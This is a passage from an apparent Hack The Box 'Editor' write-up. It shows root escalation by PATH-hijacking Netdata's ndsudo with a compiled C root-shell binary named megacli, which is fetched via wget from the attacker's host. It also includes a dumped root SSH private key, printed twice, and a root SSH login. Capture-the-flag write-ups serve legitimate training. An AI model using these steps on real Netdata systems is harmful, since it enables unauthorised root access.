-rwxr-xr-x 1 root root        8674 Apr  1  2024 tc-qos-helper.sh
-rwxr-xr-x 1 root root        2915 Apr  1  2024 template_dim.sh
```

We used `strings` to see what was available inside the `binary` and could potentially executed by manipulating the `$PATH` variable.

```shell
oliver@editor:~/bin$ strings /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo | grep -E '^[a-zA-Z0-9._-]+$'
<--- CUT FOR BREVITY --->
PATH
ndsudo
--help
--test
execve
nvme-list
nvme
nvme-smart-log
megacli-disk-info
megacli
MegaCli
megacli-battery-info
<--- CUT FOR BREVITY --->
```

Then we wrote a small `C application` to give us a `shell` as `root` when executed successfully.

```shell
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    if (setgid(0) != 0 || setuid(0) != 0) {
        perror("Privilege escalation failed");
        exit(EXIT_FAILURE);
    }

    execl("/bin/bash", "bash", "-p", NULL);

    perror("Failed to spawn shell");
    return 1;
}
```

We compiled the program and copied it to the box.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Editor/serve]
└─$ gcc megacli.c -o megacli
```

```shell
oliver@editor:/tmp$ wget http://10.10.16.45/megacli
--2025-08-02 20:27:24--  http://10.10.16.45/megacli
Connecting to 10.10.16.45:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16160 (16K) [application/octet-stream]
Saving to: ‘megacli’

megacli                                                    100%[========================================================================================================================================>]  15.78K  --.-KB/s    in 0.03s   

2025-08-02 20:27:24 (491 KB/s) - ‘megacli’ saved [16160/16160]
```

Then we made the binary `executable` and `exported` our `writeable path` to our `shell`.

```shell
oliver@editor:/tmp$ chmod +x megacli
```

```shell
oliver@editor:/tmp$ export PATH=/tmp:$PATH
```

As last step all what we had to do was to execute `ndsudo` using the `command` `megacli-disk-info`.

```shell
oliver@editor:/tmp$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo megacli-disk-info 
root@editor:/home/oliver/bin#
```

## root.txt

```shell
root@editor:/root# cat root.txt
9644f6431d0072dab1ce7edc1daf866a
```

## Post Exploitation

```shell
root@editor:/root/.ssh# cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
FLvpDdK+RXvFcAAAALcm9vdEBlZGl0b3I=
-----END OPENSSH PRIVATE KEY-----
```

```shell
-----BEGIN OPENSSH PRIVATE KEY-----
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
FLvpDdK+RXvFcAAAALcm9vdEBlZGl0b3I=
-----END OPENSSH PRIVATE KEY-----
```

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Editor/files]
└─$ chmod 600 root_id_rsa
```

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Editor/files]
└─$ ssh -i root_id_rsa root@editor.htb
The authenticity of host 'editor.htb (10.129.231.23)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:48: [hashed name]
    ~/.ssh/known_hosts:95: [hashed name]
    ~/.ssh/known_hosts:184: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'editor.htb' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-151-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat Aug  2 08:32:45 PM UTC 2025

  System load:  0.15              Processes:             243
  Usage of /:   65.0% of 7.28GB   Users logged in:       1
  Memory usage: 61%               IPv4 address for eth0: 10.129.231.23
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

4 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

4 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Aug 2 20:32:45 2025 from 10.10.16.45
root@editor:~#
```